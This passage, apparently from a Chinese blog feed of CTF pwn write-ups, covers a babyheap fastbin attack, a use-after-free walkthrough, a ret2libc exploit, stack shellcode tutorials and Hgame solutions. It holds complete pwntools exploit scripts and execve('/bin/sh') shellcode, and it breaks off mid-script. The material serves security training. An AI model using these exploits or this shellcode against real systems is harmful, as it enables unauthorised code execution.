&#39;a&#39;*0x13+p64(one_gadget)fill(5,payload)allocate(0x10)sh.interactive()</code></pre><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><pre><code class="python">from pwn import *context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)context.log_level = &#39;debug&#39;sh = process(&#39;./babyheap_0ctf_2017&#39;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)def allocate(size):    sh.recvuntil(&#39;Command: &#39;)    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Size: &#39;)    sh.sendline(str(size))def fill(idx,content):    sh.recvuntil(&#39;Command: &#39;)    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Index: &#39;)    sh.sendline(str(idx))    sh.recvuntil(&#39;Size: &#39;)    sh.sendline(str(len(content)))    sh.recvuntil(&#39;Content: &#39;)    sh.sendline(content)def free(idx):    sh.recvuntil(&#39;Command: &#39;)    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Index: &#39;)    sh.sendline(str(idx))def dump(idx):    sh.recvuntil(&#39;Command: &#39;)    sh.sendline(&#39;4&#39;)    sh.recvuntil(&#39;Index: &#39;)    sh.sendline(str(idx))allocate(0x10)    #0    0x00allocate(0x10)    #1    0x20allocate(0x10)    #2    0x40allocate(0x80)    #3    0x60free(2)free(1)payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+p8(0x60)    fill(0,payload)allocate(0x10)    #1payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x21)fill(1,payload)            allocate(0x10)    #2        payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x91)fill(1,payload)        allocate(0x80)    #4        free(3)                    dump(2)sh.recvuntil(&#39;Content: \n&#39;)main_arena = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88log.success(&#39;main arena: &#39;+hex(main_arena))libc_base = main_arena - 0x3c4b20log.success(&#39;libc base: &#39;+hex(libc_base))one_gadget = libc_base + 0x4526a # 0x4526a 0xf02a4 0xf1147 0x45216allocate(0x60)    #3        free(3)                    fake_chunk_addr = main_arena - 0x33        payload = p64(fake_chunk_addr)fill(2,payload)allocate(0x60)    #3allocate(0x60)    #5payload = &#39;a&#39;*0x13+p64(one_gadget)fill(5,payload)allocate(0x10)sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆之UAF(Use_after_free)及调试-hitcontraining_uaf</title>
    <link href="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/"/>
    <url>/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/</url>
    
    <content type="html"><![CDATA[<h1 id="堆之UAF-Use-after-free-及调试-hitcontraining-uaf"><a href="#堆之UAF-Use-after-free-及调试-hitcontraining-uaf" class="headerlink" title="堆之UAF(Use_after_free)及调试-hitcontraining_uaf"></a>堆之UAF(Use_after_free)及调试-hitcontraining_uaf</h1><blockquote><p><a href="https://wiki.x10sec.org/pwn/heap/use_after_free/" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/use_after_free/</a></p><p><strong>一个很直接的想法是修改note的put字段为magic函数的地址，从而实现在执行print note 的时候执行magic函数。</strong> 那么该怎么执行呢？</p><p>我们可以简单来看一下每一个note生成的具体流程</p><ol><li><p>程序申请8字节内存用来存放note中的put以及content指针。</p></li><li><p>程序根据输入的size来申请指定大小的内存，然后用来存储content。</p></li></ol><pre><code>      +-----------------+                             |   put           |                             +-----------------+                             |   content       |       size                    +-----------------+-------------------&gt;+----------------+                                             |     real       |                                             |    content     |                                             |                |                                             +----------------+</code></pre><p>那么，根据我们之前在堆的实现中所学到的，显然note是一个fastbin chunk（大小为16字节）。我们的目的是希望一个note的put字段为magic的函数地址，那么我们必须想办法让某个note的put指针被覆盖为magic地址。由于程序中只有唯一的地方对put进行赋值。所以我们必须利用写real content的时候来进行覆盖。具体采用的思路如下</p><ul><li>申请note0，real content size为16（大小与note大小所在的bin不一样即可）</li><li>申请note1，real content size为16（大小与note大小所在的bin不一样即可）</li><li>释放note0</li><li>释放note1</li><li>此时，大小为16的fast bin chunk中链表为note1-&gt;note0</li><li>申请note2，并且设置real content的大小为8，那么根据堆的分配规则</li><li>note2其实会分配note1对应的内存块。</li><li>real content 对应的chunk其实是note0。</li><li>如果我们这时候向note3的chunk部分写入magic的地址，那么由于我们没有note1为NULL。当我们再次尝试输出note1的时候，程序就会调用magic函数。</li></ul></blockquote><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><img src="2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201220702851.png" srcset="/img/loading.gif" class="" title="image-20200201220702851"><img src="2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221032403.png" srcset="/img/loading.gif" class="" title="image-20200201221032403"><p>free了但没有设置为0，所以存在uaf</p><img src="2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221102009.png" srcset="/img/loading.gif" class="" title="image-20200201221102009"><img src="2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221149782.png" srcset="/img/loading.gif" class="" title="image-20200201221149782"><p>先申请两个0x10的空间，内容为aaaa</p><pre><code class="python">add(0x10,&quot;aaaa&quot;)add(0x10,&quot;aaaa&quot;)</code></pre><img src="2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201220613982.png" srcset="/img/loading.gif" class="" title="image-20200201220613982"><p>最下面的是top chunk，我们申请了的两块0x10空间，还有两块是因为下图，并且，堆块地址向上生长</p><img src="2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221459981.png" srcset="/img/loading.gif" class="" title="image-20200201221459981"><p>所以，最先的<code>0x826300</code>和<code>0x826328</code>应该就是最先分配的notelist[i]，里面存放着指向print_note_content的地址，<code>0x826310</code>和<code>0x826338</code>就是我们自己申请的堆了</p><p>然后在我们delete了这两个堆块之后，（由于重新运行程序所以地址改变</p><pre><code class="python">delete(0)delete(1)</code></pre><img src="2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201224306213.png" srcset="/img/loading.gif" class="" title="image-20200201224306213"><img src="2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201224344952.png" srcset="/img/loading.gif" class="" title="image-20200201224344952"><p><code>0x902e010</code>（我们申请的）和<code>0x902e00</code>（存放puts地址的）先进入fastbins单链表</p><p>然后此时我们再<code>add(8,p32(shell))</code></p><img src="2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201225157906.png" srcset="/img/loading.gif" class="" title="image-20200201225157906"><img src="2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201225221156.png" srcset="/img/loading.gif" class="" title="image-20200201225221156"><p><code>0x87d0028</code>先出来，储存print地址，然后再<code>0x87d0000</code>,储存magic地址</p><p>最后，我们再print heap0时，就跳转到了magic地址上面去了</p><hr><h2 id="有待深究。。。。"><a href="#有待深究。。。。" class="headerlink" title="有待深究。。。。"></a>有待深究。。。。</h2>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BrainOverFlow_Vol.1_BUU特供</title>
    <link href="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/"/>
    <url>/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="BrainOverFlow-Vol-1-BUU特供"><a href="#BrainOverFlow-Vol-1-BUU特供" class="headerlink" title="BrainOverFlow_Vol.1_BUU特供"></a>BrainOverFlow_Vol.1_BUU特供</h1><p>很有意思（好玩）的游戏，感谢札哥的题</p><img src="2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195435399.png" srcset="/img/loading.gif" class="" title="image-20200130195435399"><p>btw，我也没想到我会是第六个解出来的hhhhh，我可以吹一个月（笑</p><p>剧情我就不说了，反正很有意思的</p><p>具体东西都藏在/www/data里边，每一次的地图数据（主要在Map013，15，22）都有，个人等级，姓名，武器售卖价值等都可以改hhhhh</p><p>亏我三小时打通游戏，做了半天pwn以为是盲打，然后发现了文件就在图片旁边orz</p><h2 id="protect"><a href="#protect" class="headerlink" title="protect"></a>protect</h2><img src="2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130200100596.png" srcset="/img/loading.gif" class="" title="image-20200130200100596"><img src="2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195934944.png" srcset="/img/loading.gif" class="" title="image-20200130195934944"><img src="2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195944896.png" srcset="/img/loading.gif" class="" title="image-20200130195944896"><p>这图就是溢出点，buf空间只有0x40，但是却读入0xC8个，题目没有system和/bin/sh字段，就是ret2libc</p><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;./protect&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./protect&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&#39;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#39;)    sh.recvuntil(&quot;options&quot;)    sh.sendline(&quot;1&quot;)    sh.recvuntil(&quot;Password.&quot;)    pop_rdi = 0x0000000000400a43 # 通过ROPgadget获得    payload = cyclic(0x40 + 8)    payload += p64(pop_rdi)    payload += p64(elf.got[&#39;__libc_start_main&#39;])    payload += p64(elf.plt[&#39;puts&#39;])    payload += p64(0x40094B)    #pause()    sh.sendline(payload)    __libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))     libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]    system = libc + lib.symbols[&#39;system&#39;]    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()    log.success(&quot;libc: &quot; + hex(libc))    log.success(&quot;system: &quot; + hex(system))    log.success(&quot;binsh: &quot; + hex(binsh))    sh.recvuntil(&quot;options&quot;)    sh.sendline(&quot;1&quot;)    sh.recvuntil(&quot;Password.&quot;)    payload = cyclic(0x40 + 8)    payload += p64(pop_rdi)    payload += p64(binsh)    payload += p64(system)    #pause()    sh.sendline(payload)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;123.206.21.178&quot;,10000,0)</code></pre><blockquote><p><a href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#_9" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#_9</a></p><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而 libc 在github上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p><ul><li><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></li></ul><p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn_by_examples</title>
    <link href="/2020/01/28/pwn_by_examples/"/>
    <url>/2020/01/28/pwn_by_examples/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn-by-examples"><a href="#pwn-by-examples" class="headerlink" title="pwn_by_examples"></a>pwn_by_examples</h1><p>x64参数按在rdi,rsi,rdx,rcs,r8,r9依次储存</p><h2 id="IDA部分"><a href="#IDA部分" class="headerlink" title="IDA部分"></a>IDA部分</h2><p>shift f12 字符串</p><p>n 重命名</p><p>x 查看引用</p><h2 id="bash部分"><a href="#bash部分" class="headerlink" title="bash部分"></a>bash部分</h2><pre><code class="bash">cyclic 200 #生成循环 200个cyclic -l xxxxx #计算偏移</code></pre><h2 id="PWNTOOLS部分"><a href="#PWNTOOLS部分" class="headerlink" title="PWNTOOLS部分"></a>PWNTOOLS部分</h2><pre><code>u64 asm disasm </code></pre><pre><code class="python">from pwn import *sh = process(&#39;./ret2libc2&#39;)elf = ELF(&#39;./ret2libc2&#39;)rop = ROP(elf)payload = &#39;a&#39; * offsetpayload += p32(elf.plt[&#39;gets&#39;])payload += p32(rop.search(8).address)payload += p32(elf.bss() + 0x100)payload += p32(elf.plt[&#39;system&#39;])payload += p32(0)payload += p32(elf.bss() + 0x100)sh.sendline(payload)sh.sendline(&#39;/bin/sh\x00&#39;)sh.interactive()</code></pre><p>先执行了pop_ret 然后执行gets，并放到了bss()+ 0x100的地方。随后system(elf.bss()+ 0x100)</p><h2 id="pwndbg部分"><a href="#pwndbg部分" class="headerlink" title="pwndbg部分"></a>pwndbg部分</h2><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>jmp esp</p><p>函数返回的时候esp会刚好指向返回地址的下一个地址</p><img src="2020/01/28/pwn_by_examples/image-20200125172524547.png" srcset="/img/loading.gif" class="" title="image-20200125172524547"><hr><blockquote><p>作者：看雪学院<br>链接：<a href="https://www.jianshu.com/p/1bdac9837eff" target="_blank" rel="noopener">https://www.jianshu.com/p/1bdac9837eff</a><br>来源：简书</p></blockquote><h2 id="第一题（堆栈直接执行shellcode）"><a href="#第一题（堆栈直接执行shellcode）" class="headerlink" title="第一题（堆栈直接执行shellcode）"></a>第一题（堆栈直接执行shellcode）</h2><p>接下来这题，我们再轻松一点，可以直接在堆栈中执行程序。</p><p>pwn5（参考“阅读原文”）</p><p>继续前面的套路。</p><p><strong>第一步，查看保护</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-41da81266dc47fff?imageMogr2/auto-orient/strip%7CimageView2/2/w/644/format/webp" srcset="/img/loading.gif" alt="img"></p><p>发现，可以直接在堆栈上执行程序了，开启的是PIE，地址随机化的保护。</p><p><strong>第二步，判断漏洞函数。</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-8b1062016fc33b8b?imageMogr2/auto-orient/strip%7CimageView2/2/w/480/format/webp" srcset="/img/loading.gif" alt="img"></p><p>发现函数是read，仅仅读取0x40（64）个字节。</p><p><strong>第三步，计算目标变量的在堆栈中距离ebp的偏移</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-14fee87811eb443d?imageMogr2/auto-orient/strip%7CimageView2/2/w/388/format/webp" srcset="/img/loading.gif" alt="img"></p><p>EBP的内容为：0x3761413661413561</p><blockquote><p>$ python patternLocOffset.py -l 700 -s 0x3761413661413561</p><p>[*] Create pattern string contains 700 characters ok!</p><p>[*] No exact matches, looking for likely candidates…</p><p>[+] Possible match at offset 16 (adjusted another-endian)</p><p>[+] take time: 0.0005 s</p></blockquote><p>距离EBP的偏移是16个字节，距离存放的返回地址是16+8=24个字节。</p><p>这里可以发现IDA分析的又是正确的了，0x10个字节。</p><p><strong>第四步和第五步，分析是否已经载入了可以利用的函数</strong></p><p>如system，execve等</p><p>发现，并没有上述函数。但是由于堆栈可以执行，因此我们可以考虑直接将shellcode阻止在payload里面。因此，这里和第五步分析是否有字符串/bin/sh合并了，我们可以自己放置字符串，并且调用对应的地址了。</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-15f527ac95286278?imageMogr2/auto-orient/strip%7CimageView2/2/w/448/format/webp" srcset="/img/loading.gif" alt="img"></p><p>理论上，我们可以直接利用pwntools产生的shellcode来进行部署，但是这道题有点特殊。在返回地址之后所剩余的空间=64-24-8=32个字节（返回地址还要占用8个字节），因此实际部署shellcode的长度还剩下32个字节，使用pwntools产生的shellcode有44个字节，太长了。因此，我们可以从网上找到更短的shellcode：</p><blockquote><p># 23 bytes</p><p># <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a></p><p>shellcode_x64 = “\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p></blockquote><p>它的汇编形式是：</p><blockquote><p># char *const argv[]</p><p>xorl %esi, %esi</p><p>#</p><p> ‘h’ ‘s’ ‘/‘ ‘/‘ ‘n’ ‘i’ ‘b’ ‘/‘</p><p>movq $0x68732f2f6e69622f, %rbx</p><p>#</p><p> for ‘\x00’</p><p>pushq %rsi</p><p>pushq %rbx</p><p>pushq %rsp</p><p>#</p><p> const char *filename</p><p>popq %rdi</p><p>#</p><p> __NR_execve 59</p><p>pushq $59</p><p>popq %rax</p><p>#</p><p> char *const envp[]</p><p>xorl %edx, %edx</p><p>syscall</p></blockquote><p>好了，shellcode确定好了，我们现在还有一个问题。Shellcode执行的地址如何确定呢？shellcode的地址，其实就是buf的地址加上32个字节的偏移。</p><p>我们前面发现，该程序是动态改变地址的，因此静态的确认buf地址是不可行的，进而静态的确认shellcode的地址是不可行的。</p><p>处理到这里好像有点死胡同了，我们发现程序中有printf函数，理论上可以利用它来打印buf的地址，然后实时的计算buf+32的地址，就能够得到shellcode的地址。但是，我们回头看看程序本身的执行，会发现：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-e928c61d7e0eba62?imageMogr2/auto-orient/strip%7CimageView2/2/w/729/format/webp" srcset="/img/loading.gif" alt="img"></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-6fa118c955729fc4?imageMogr2/auto-orient/strip%7CimageView2/2/w/506/format/webp" srcset="/img/loading.gif" alt="img"></p><p>它实际上已经为我们解决了这个问题，自己输出了buf的地址（= = CTF题目的难易程度真的是微妙之间呀）。</p><p>那么，我们的exp思路就是： 实时读取buf的地址，计算buf+32得到shellcode的地址，放置在payload中。</p><blockquote><p>from pwn import *</p><p>code = ELF(‘./pwn5’)</p><p># 23 bytes</p><p># <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a></p><p>shellcode_x64 = “\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p><p>sh.recvuntil(‘[‘)</p><p>buf_addr = sh.recvuntil(‘]’, drop=True)</p><p>buf_addr = int(buf_addr, 16)</p><p>payload = ‘b’ * 24 + p64(buf_addr + 32) + shellcode_x64</p><p>sh.sendline(payload)</p><p>sh.interactive()</p></blockquote><p>堆栈的布置图，以及地址的相对位置，以buf为起点。</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-bb20383a152f69a1?imageMogr2/auto-orient/strip%7CimageView2/2/w/699/format/webp" srcset="/img/loading.gif" alt="img"></p><p>第二题（控制esp进行精准打击）</p><p>接下来，我们来点有难度的。在这个程序中，我们的payload实在放不下了，即使是23字节，那么怎么办呢？</p><p>pwn6（参考“阅读原文”）</p><p>继续前面的过程：</p><p><strong>第一步：检测保护情况</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-803630bd28a73fb7?imageMogr2/auto-orient/strip%7CimageView2/2/w/520/format/webp" srcset="/img/loading.gif" alt="img"></p><p>发现，是个三无程序。么有任何保护，看起来很简单？哈哈，并没有。看官请继续。</p><p><strong>第二步，判断漏洞函数</strong></p><p>如gets,scanf等：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-4208fca26260a9d6?imageMogr2/auto-orient/strip%7CimageView2/2/w/313/format/webp" srcset="/img/loading.gif" alt="img"></p><p>发现是fgets函数，仅仅读取50个字节的字符长度。</p><p><strong>第三步</strong></p><p>计算目标变量的在堆栈中距离ebp的偏移。</p><p>方法和前面类似，发现偏移距离ebp是0x20，那么距离ret_addr就是0x20+4=0x24（36）字节了。</p><p><strong>第四步和第五步</strong></p><p>分析是否已经载入了可以利用的函数。发现并没有：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-ec80829673fdb148?imageMogr2/auto-orient/strip%7CimageView2/2/w/461/format/webp" srcset="/img/loading.gif" alt="img"></p><blockquote><p>$ ROPgadget –binary stack_pivoting_1 –string ‘/bin/sh’</p><p>Strings information</p><p>============================================================</p></blockquote><p>字符串自然也是没有的。</p><p>我们考虑利用shellcode，好像可以类似于上一题的操作了。但是并不能，留给我们布置shellcode的长度为50-36-4=10字节（同样有4个字节的返回地址存放）！尴尬不==，放两个地址就没有位置了。但如果你能够厉害到用10个字节做shellcode，请大胆分享出来！</p><p>那么怎么办呢？</p><p>既然，堆栈溢出的位置不行了，那么我们就把shellcode放在栈里面吧！因为堆栈具有可执行的权限，因此这样完全是可行的。</p><p>这里，我先放图出来解释一下思路：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-605a219a5314b46c?imageMogr2/auto-orient/strip%7CimageView2/2/w/679/format/webp" srcset="/img/loading.gif" alt="img"></p><p>我们这样就总共有0x20（36个字节）的位置存放shellcode的了，顿时感觉找到了新出路。但是，要做到跳转到放置shellcode的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：</p><p>推算shellcode放置的地址</p><p>跳转到shellcode放置的位置</p><p>首先，第一点，shellcode的位置就是发射payload的时候esp_old的位置，我们可以推算出来，当程序提取完返回地址之后，esp指向的地址距离esp_old的地址为0x20+4(ebp)+4(ret_addr)=0x28。因此，我们需要用当前的esp-0x28，得到的就是shellcode的地址。</p><p>对于第二点，我们如何让eip顺利的依次取出我们设计好的路线图呢？在ret_addr，我们需要寻找到一个gadget，它能够跳转到esp的位置，以继续往后执行栈上的代码。注意，这里我们为什么不直接将可执行的代码布置在ret_addr的位置，因为这里是原本的函数提取返回函数地址的地方，它并不会执行这里位置的代码，而是执行这个位置的内容指向的地址的代码。我们需要jmp esp这个操作，来让程序流获得在栈上执行的先河。</p><blockquote><p>$ ROPgadget –binary stack_pivoting_1 –only ‘jmp|ret’ | grep ‘esp’</p><p>0x08048504 : jmp esp</p></blockquote><p>发现只有这么一个地址。0x08048504。这也正是图中的位置。注意，当我们取出ret_addr里面的地址的时候，esp已经+4了，因此就会指向我们的下一步操作：跳转回esp_old的位置。</p><p>在这里，我们直接可以选择让pwntools产生可执行的代码”sub  esp 0x28; jmp esp”。注意，这里可以是直接运行的代码，因为我们的程序已经开始在栈上执行了，而不再是取出地址了。</p><p>最后的EXP按照下面这样布置：</p><blockquote><p>from pwn import *</p><p>sh = process(‘./pwn6’)</p><p>shellcode_x86 = “\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73”</p><p>shellcode_x86 += “\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0”</p><p>shellcode_x86 += “\x0b\xcd\x80”</p><p>sub_esp_jmp = asm(‘sub esp, 0x28;jmp esp’)</p><p>jmp_esp = 0x08048504</p><p>payload = shellcode_x86 + (</p><p>0x20 - len(shellcode_x86)) * ‘b’ + ‘bbbb’ + p32(jmp_esp) + sub_esp_jmp</p><p>sh.sendline(payload)</p><p>sh.interactive()</p></blockquote><p>注意，这里我们又启用了另外一段代码：</p><p>它更加短，只有21个字节。Shellcode越短是越好的。它的汇编对应如下：</p><blockquote><p>shellcode_x86 = “\x31\xc9”          # xor   ecx, ecx</p><p>shellcode_x86 += “\xf7\xe1”       # mul   ecx</p><p>shellcode_x86 += “\x51”       # push  ecx</p><p>shellcode_x86 += “\x68\x2f\x2f\x73\x68” # push 0x68732f2f</p><p>shellcode_x86 += “\x68\x2f\x62\x69\x6e” # push 0x6e69622f </p><p>shellcode_x86 += “\x89\xe3”       # mov   ebx, esp</p><p>shellcode_x86 += “\xb0\x0b”       # moval, 0xb</p><p>shellcode_x86 += “\xcd\x80” # int 0x80</p></blockquote><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>1、编辑功能是否存在溢出</p><p>2、delete地方是否存在多重释放漏洞，删除了节点之后有没有清0</p><p>​    检查了节点是否存在，就不能double free</p><p>​    heaparray[v1] = 0LL 清零了</p><p>3、在show函数中有没有检查节点是否存在</p><p>v0[1] = malloc(size) 没有对大小限制也算漏洞</p><p>只有分配大小不能被2*sizeof(size_t)时才会把下一块chunk的prev_size当作自己的内容区域</p><h3 id="off-by-one-漏洞"><a href="#off-by-one-漏洞" class="headerlink" title="off by one 漏洞"></a>off by one 漏洞</h3><p><strong>要使用off by one，malloc大小不能是16的倍数（64位情况下）</strong></p><p>read_input(*(headparray[v1] + 1), *heaparray[v1] + 1LL);</p><p>能够修改下一块chunk的size字段，这种情况一般被称为堆扩展技术</p><img src="2020/01/28/pwn_by_examples/image-20200126175331744.png" srcset="/img/loading.gif" class="" title="image-20200126175331744"><img src="2020/01/28/pwn_by_examples/image-20200126175341238.png" srcset="/img/loading.gif" class="" title="image-20200126175341238"><img src="2020/01/28/pwn_by_examples/image-20200126181904887.png" srcset="/img/loading.gif" class="" title="image-20200126181904887">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
      <category>教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hgame</title>
    <link href="/2020/01/28/Hgame/"/>
    <url>/2020/01/28/Hgame/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2020"><a href="#Hgame2020" class="headerlink" title="Hgame2020"></a>Hgame2020</h1><h2 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h2><img src="2020/01/28/Hgame/image-20200116233004577.png" srcset="/img/loading.gif" class="" title="image-20200116233004577"><img src="2020/01/28/Hgame/image-20200116233016869.png" srcset="/img/loading.gif" class="" title="image-20200116233016869"><p>V5在-0x31，s在-0xAC</p><pre><code class="python">sh.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)payload=&quot;a&quot;*(0xAC - 0x31)payload += &#39;0O0o\x00O0&#39;sh.send(payload)sh.interactive()</code></pre><h2 id="One-Shot"><a href="#One-Shot" class="headerlink" title="One_Shot"></a>One_Shot</h2><img src="2020/01/28/Hgame/image-20200117005607628.png" srcset="/img/loading.gif" class="" title="image-20200117005607628"><img src="2020/01/28/Hgame/image-20200117005622807.png" srcset="/img/loading.gif" class="" title="image-20200117005622807"><p>0xE0 - 0xC0之后刚好是32位，这样第</p><pre><code class="python">payload = cyclic(0xE0 - 0xC0)sh.send(payload)sh.recvuntil(&quot;shot!\n&quot;)payload = str(6295776)sh.send(payload)</code></pre><h2 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h2><h2 id="open-read-puts"><a href="#open-read-puts" class="headerlink" title="open_read_puts"></a>open_read_puts</h2><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;./ROP_LEVEL0&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./ROP_LEVEL0&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)        #lib = ELF(&#39;./home/robye/Desktop/PWN/libc/64-libc-2.27.so&#39;)    pop_rsi_r15_ret = 0x400751     pop_rdi_ret = 0x400753    buf = 0x601060    open_plt = elf.plt[&#39;open&#39;]    open_addr = 0x4006A3    payload = cyclic(0x50+ 8)    payload += p64(pop_rsi_r15_ret)    payload += p64(elf.bss()+0x100)    payload += 